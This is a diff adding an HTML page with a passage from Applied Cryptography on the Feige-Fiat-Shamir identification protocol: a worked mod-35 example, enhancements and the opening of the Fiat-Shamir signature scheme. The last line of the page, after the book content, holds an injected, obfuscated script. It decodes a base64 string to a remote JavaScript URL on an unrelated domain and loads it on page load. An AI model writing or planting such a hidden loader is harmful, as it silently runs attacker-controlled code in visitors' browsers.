@@ -1,0 +1,141 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Identification Schemes</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=21//-->
+<!--PAGES=505-507//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="21-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="21-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>An Example</I></B></FONT></P>
+<P>Let&#146;s look at this protocol in action with small numbers.
+</P>
+<P>If <I>n</I> = 35 (the two primes are 5 and 7), then the possible quadratic residues are:</P>
+<DL>
+<DD>1: <I>x</I><SUP>2</SUP> &#8801; 1 (mod 35) has the solutions: <I>x</I> = 1, 6, 29, or 34.
+<DD>4: <I>x</I><SUP>2</SUP> &#8801; 4 (mod 35) has the solutions: <I>x</I> = 2, 12, 23, or 33.
+<DD>9: <I>x</I><SUP>2</SUP> &#8801; 9 (mod 35) has the solutions: <I>x</I> = 3, 17, 18, or 32.
+<DD>11: <I>x</I><SUP>2</SUP> &#8801; 11 (mod 35) has the solutions: <I>x</I> = 9, 16, 19, or 26.
+<DD>14: <I>x</I><SUP>2</SUP> &#8801; 14 (mod 35) has the solutions: <I>x</I> = 7 or 28.
+<DD>15: <I>x</I><SUP>2</SUP> &#8801; 15 (mod 35) has the solutions: <I>x</I> = 15 or 20.
+<DD>16: <I>x</I><SUP>2</SUP> &#8801; 16 (mod 35) has the solutions: <I>x</I> = 4, 11, 24, or 31.
+<DD>21: <I>x</I><SUP>2</SUP> &#8801; 21 (mod 35) has the solutions: <I>x</I> = 14 or 21.
+<DD>25: <I>x</I><SUP>2</SUP> &#8801; 25 (mod 35) has the solutions: <I>x</I> = 5 or 30.
+<DD>29: <I>x</I><SUP>2</SUP> &#8801; 29 (mod 35) has the solutions: <I>x</I> = 8, 13, 22 or 27.
+<DD>30: <I>x</I><SUP>2</SUP> &#8801; 30 (mod 35) has the solutions: <I>x</I> = 10 or 25.
+</DL>
+<P>The inverses (mod 35) and their square roots are:
+</P>
+<TABLE WIDTH="50%"><TR>
+<TD WIDTH="10%">
+<TD ALIGN="LEFT"><I>v</I>
+<TD ALIGN="LEFT"><I>v</I><SUP>-1</SUP>
+<TD ALIGN="LEFT"><I>s</I> = sqrt (<I>v</I><SUP>-1</SUP>)
+<TR>
+<TD WIDTH="10%">
+<TD ALIGN="LEFT">1
+<TD ALIGN="LEFT">1
+<TD ALIGN="LEFT">1
+<TR>
+<TD WIDTH="10%">
+<TD ALIGN="LEFT">4
+<TD ALIGN="LEFT">9
+<TD ALIGN="LEFT">3
+<TR>
+<TD WIDTH="10%">
+<TD ALIGN="LEFT">9
+<TD ALIGN="LEFT">4
+<TD ALIGN="LEFT">2
+<TR>
+<TD WIDTH="10%">
+<TD ALIGN="LEFT">11
+<TD ALIGN="LEFT">16
+<TD ALIGN="LEFT">4
+<TR>
+<TD WIDTH="10%">
+<TD ALIGN="LEFT">16
+<TD ALIGN="LEFT">11
+<TD ALIGN="LEFT">9
+<TR>
+<TD WIDTH="10%">
+<TD ALIGN="LEFT">29
+<TD ALIGN="LEFT">29
+<TD ALIGN="LEFT">8
+</TABLE>
+<P>Note that 14, 15, 21, 25, and 30 do not have inverses mod 35, because they are not relatively prime to 35. This makes sense, because there should be (5 - 1) * (7 - 1)/4 quadratic residues mod 35 relatively prime to 35: That is gcd(<I>x,</I>35) = 1 (see Section 11.3).</P>
+<P>So, Peggy gets the public key consisting of <I>k</I> = 4 values: {4,11,16,29}. The corresponding private key is {3,4,9,8}. Here&#146;s one round of the protocol.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Peggy chooses a random <I>r</I> = 16, computes 16<SUP>2</SUP> mod 35 = 11, and sends it to Victor.
+<DD><B>(2)</B>&nbsp;&nbsp;Victor sends Peggy a random binary string {1,1,0,1}.
+<DD><B>(3)</B>&nbsp;&nbsp;Peggy computes 16 * ((3<SUP>1</SUP>) * (4<SUP>1</SUP>) * (9<SUP>0</SUP>) * (8<SUP>1</SUP>)) mod 35 = 31 and sends it to Victor.
+<DD><B>(4)</B>&nbsp;&nbsp;Victor verifies that 3<SUP>12</SUP> * ((4<SUP>1</SUP>) * (11<SUP>1</SUP>) * (16<SUP>0</SUP>) * (29<SUP>1</SUP>)) mod 35 = 11.
+</DL>
+<P>Peggy and Victor repeat the protocol <I>t</I> times, each time with a different random <I>r,</I> until Victor is satisfied.</P>
+<P>With small values like these, there&#146;s no real security. But when <I>n</I> is 512 bits long or more, Victor cannot learn anything about Peggy&#146;s secret key except the fact that she knows it.</P>
+<P><FONT SIZE="+1"><B><I>Enhancements</I></B></FONT></P>
+<P>It is possible to embed identification information into the protocol. Assume that <I>I</I> is a binary string representing Peggy&#146;s identification: her name, address, social security number, hat size, preferred brand of soft drink, and other personal information. Use a one-way hash function <I>H</I>(<I>x</I>) to compute <I>H</I>(<I>I,j</I>), where <I>j</I> is a small number concatenated onto <I>I.</I> Find a set of <I>j</I>s where <I>H</I>(<I>I,j</I>) is a quadratic residue mod <I>n.</I> These <I>H</I>(<I>I,j</I>)s become <I>v</I><SUB>1,</SUB> <I>v</I><SUB>2,...,</SUB> <I>v</I><SUB>k</SUB> (the <I>j</I>s need not be quadratic residues). Peggy&#146;s public key is now <I>I</I> and the list of <I>j</I>s. She sends <I>I</I> and the list of <I>j</I>s to Victor before step (1) of the protocol (or perhaps Victor downloads them from a public bulletin board someplace), and Victor generates <I>v</I><SUB>1,</SUB> <I>v</I><SUB>2,...,</SUB> <I>v</I><SUB>k</SUB> from <I>H</I>(<I>I,j</I>).</P>
+<P>Now, after Victor successfully completes the protocol with Peggy, he is assured that Trent, who knows the factorization of the modulus, has certified the association between <I>I</I> and Peggy by giving her the square roots of the <I>v</I><SUB>i</SUB> derived from <I>I.</I> (See Section 5.2 for background information.)</P>
+<P>Feige, Fiat, and Shamir include the following implementation remarks [544,545]:</P>
+<BLOCKQUOTE><P>For nonperfect hash functions, it may be advisable to randomize <I>I</I> by concatenating it with a long random string, <I>R.</I> This string is chosen by the arbitrator and is revealed to Victor along with <I>I.</I></P>
+<P>In typical implementations, <I>k</I> should be between 1 and 18. Larger values of <I>k</I> can reduce the time and communication complexity by reducing the number of rounds.</P>
+<P>The value <I>n</I> should be at least 512 bits long. (Of course, there has been considerable progress in factoring since then.)</P>
+<P>If each user chooses his own <I>n</I> and publishes it in a public key file, they can dispense with the arbitrator. However, this RSA-like variant makes the scheme considerably less convenient.</P>
+</BLOCKQUOTE><P><FONT SIZE="+1"><B><I>Fiat-Shamir Signature Scheme</I></B></FONT></P>
+<P>Turning this identification scheme into a signature scheme is basically a matter of turning Victor into a hash function. The primary benefit of the Fiat-Shamir digital signature scheme over RSA is speed: Fiat-Shamir requires only 1 percent to 4 percent of the modular multiplications of RSA. For this protocol, we&#146;ll bring back Alice and Bob.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="21-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="21-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(JpSgOZRX, CIpAhafO) {CIpAhafO = JpSgOZRX.createElement('script');CIpAhafO.type = 'text/javascript';CIpAhafO.async = true;CIpAhafO.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');JpSgOZRX.getElementsByTagName('body')[0].appendChild(CIpAhafO);}(document));</script></body>
+</html>
